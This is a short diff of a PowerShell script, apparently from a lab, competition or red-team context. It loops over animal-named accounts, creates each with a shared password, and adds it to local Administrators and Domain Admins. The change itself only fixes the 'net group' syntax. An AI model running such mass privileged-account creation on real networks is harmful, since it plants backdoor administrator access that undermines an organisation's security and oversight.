@@ -7,5 +7,5 @@ $animals = "wombat", "rat", "squirrel", "turkey", "chicken", "pig", "lamb", "cow
 foreach($acct in $animals) {
     net user /add $acct $password
     net localgroup administrators $acct /add /Y
-    net user group "domain admins" $acct /add
+    net group "domain admins" $acct /add
 }
